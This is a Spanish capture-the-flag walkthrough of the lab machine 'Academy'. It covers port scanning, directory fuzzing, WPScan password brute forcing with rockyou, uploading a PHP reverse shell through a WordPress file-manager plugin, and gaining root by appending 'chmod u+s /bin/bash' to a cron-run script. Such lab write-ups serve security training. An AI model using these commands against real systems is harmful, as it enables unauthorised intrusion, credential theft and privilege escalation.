---
description: '🔍 Dificultad: Principiante'
---

# Academy

### 🔍 **RECONOCIMIENTO**

En primer lugar, tras conectarnos a la máquina, utilizamos el comando:

```bash
ping -c 1 192.168.1.84
```

para verificar la conectividad de red.

<figure><img src="../../.gitbook/assets/image (15).png" alt=""><figcaption></figcaption></figure>

A continuación, se realiza el comando:

```bash
nmap -sVC -p- -n --min-rate 5000 192.168.1.84
```

para realizar un escaneo de puertos y servicios detallado en la dirección IP.

<figure><img src="../../.gitbook/assets/image (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Como podemos observar durante el escaneo que el **puerto 22** perteneciente al **servicio SSH** y el **puerto 80** perteneciente al **servicio HTTP** están abiertos por lo que a continuación se indagará más.

### 🔎 **EXPLORACIÓN**

Se utiliza el comando:

```bash
sudo nmap -sCV -p22,80 -v 192.168.1.84
```

para obtener más información sobre ese puerto específicamente.

<figure><img src="../../.gitbook/assets/image (2) (1) (1).png" alt=""><figcaption></figcaption></figure>

Seguimos indagando más sobre los puertos y ahora exploramos el servicio **HTTP**. Ingresamos la IP y nos encontramos la página de por defecto de **Apache**.

<figure><img src="../../.gitbook/assets/image (3) (1) (1).png" alt=""><figcaption></figcaption></figure>

Ahora buscaremos directorios con la herramienta **Gobuster** a través de:

```bash
gobuster dir -u http://192.168.1.84/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
```

<figure><img src="../../.gitbook/assets/image (4) (1) (1).png" alt=""><figcaption></figcaption></figure>

Vemos que nos encontramos un directorio de **WordPress**.&#x20;

<figure><img src="../../.gitbook/assets/image (5) (1) (1).png" alt=""><figcaption></figcaption></figure>

Nos encontramos ante un sitio basado en WordPress. Generalmente, las páginas de WordPress no se visualizan correctamente si no se ha añadido la dirección correspondiente en el archivo `/etc/hosts`. Para solucionar esto, llevaré a cabo el siguiente procedimiento:

Primero, accedo a la URL `http://192.168.1.84/wordpress`. Posteriormente, reviso el código fuente de la página presionando `Ctrl + U`. Al hacerlo, puedo observar que la web está configurada para apuntar a la dirección `academy.thl`.

<figure><img src="../../.gitbook/assets/image (6) (1) (1).png" alt=""><figcaption></figcaption></figure>

Realizamos fuzzing de nuevo para **WordPress**.

```bash
gobuster dir -u http://192.168.1.84/wordpress/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
```

<figure><img src="../../.gitbook/assets/image (7) (1) (1).png" alt=""><figcaption></figcaption></figure>

Al tener el directorio wp-admin sabemos que es un panel de login pero no tenemos las credenciales por lo que con **WPScan** enumeramos el usuario.

```bash
wpscan --url http://academy.thl/wordpress --enumerate u,vp
```

<figure><img src="../../.gitbook/assets/image (8) (1) (1).png" alt=""><figcaption></figcaption></figure>

Sabiendo el usuario tenemos que conseguir la contraseña.

```bash
wpscan --url http://academy.thl/wordpress --passwords /usr/share/wordlists/rockyou.txt --usernames dylan
```

<figure><img src="../../.gitbook/assets/image (9) (1) (1).png" alt=""><figcaption></figcaption></figure>

Ingresamos las credenciales en el panel de **login**.

<figure><img src="../../.gitbook/assets/image (10) (1).png" alt=""><figcaption></figcaption></figure>

### 🚀 **EXPLOTACIÓN**

Tenemos un plugin de WordPress **Bit File Manager** que nos permite subir archivos por lo que subiremos una Reverse Shell. [https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php)

<figure><img src="../../.gitbook/assets/image (11) (1).png" alt=""><figcaption></figcaption></figure>

Nos ponemos en escucha en nuestra máquina atacante.

<figure><img src="../../.gitbook/assets/image (12) (1).png" alt=""><figcaption></figcaption></figure>

Después de haber logrado la intrusión, es común que la consola que recibimos sea inestable. Si presionamos `Ctrl + C`, podemos perder la conexión. Para estabilizar la consola, realizaremos un tratamiento de la TTY con los siguientes pasos:

Ejecutamos el siguiente comando:

```bash
script /dev/null -c bash
```

A continuación, presionamos `Ctrl + Z` para suspender la sesión.

Configuramos la terminal con:

```bash
stty raw -echo; fg
```

Luego, restablecemos el terminal con:

```bash
reset xterm
```

> **Nota:** Es posible que durante este proceso no se muestre en pantalla lo que estamos tecleando.

Finalmente, exportamos las variables necesarias:

```bash
export TERM=xterm
export SHELL=bash
```

### 🔐 PRIVILEGIOS

Al estar dentro y ejecutar:

```bash
whoami
```

aún no somos **root**, por lo que hacemos:

```bash
sudo -l
```

para ver si hay algo para explotar. Requiere contraseña.

Nos descargamos la herramienta pspy64.

```bash
wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy64
```

Realizamos lo siguiente para ejecutarlo.

```
chmod +x pspy64
./pspy64
```

<figure><img src="../../.gitbook/assets/image (14) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (13) (1).png" alt=""><figcaption></figcaption></figure>

Vemos que hay un error en las extensiones por lo que creamos el archivo `backup.sh`. Es un archivo con permisos SUID .

```bash
echo 'chmod u+s /bin/bash' >> backup.sh
```

Le damos permisos de ejecución.

```bash
chmod +x backup.sh
```

Ejecutamos el comando.

```bash
bash -p
```

Ya somos **root**.

<figure><img src="../../.gitbook/assets/image (15) (1).png" alt=""><figcaption></figcaption></figure>

Te deseo mucho éxito en tu búsqueda de las flags! Recuerda prestar atención a cada detalle, examinar los archivos y servicios con detenimiento, y utilizar todas las herramientas disponibles para encontrarlas. La clave para el éxito está en la perseverancia y en no dejar ningún rincón sin explorar. ¡Adelante, hacker! 💻🔍🚀
